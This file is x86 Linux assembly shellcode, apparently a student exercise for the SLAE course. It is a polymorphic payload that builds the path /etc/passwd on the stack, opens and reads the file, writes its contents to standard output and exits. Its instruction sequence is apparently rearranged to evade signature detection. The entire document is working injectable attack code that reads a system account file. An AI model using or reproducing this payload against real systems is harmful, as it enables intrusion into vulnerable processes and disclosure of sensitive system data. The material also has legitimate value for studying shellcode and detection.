; poly_tiny.nasm
; 
; this shellcode reads the contents from /etc/passwd
;
; Author: Xenofon Vassilakopoulos 
; 
; Student ID: SLAE - 1314 

global _start

section .text

_start:

        shr ecx, 16
        mul ecx
        mov al, 5
        mov dword [esp-4], ecx
        mov dword [esp-8], 0x64777373
        mov dword [esp-0ch], 0x61702f63
        mov dword [esp-10h], 0x74652f2f
        sub esp, 10h
        mov ebx, esp
        mov dx, 0x1bc
        int 0x80

        mov ecx, ebx
        mov ebx, eax

        mov al, 3
        mov dx, 0xffe
        inc dx
        int 0x80

        xor eax, eax
        mov al, 4
        sub bl, 2
        int 0x80

        xor eax, eax
        inc al
        int 0x80 
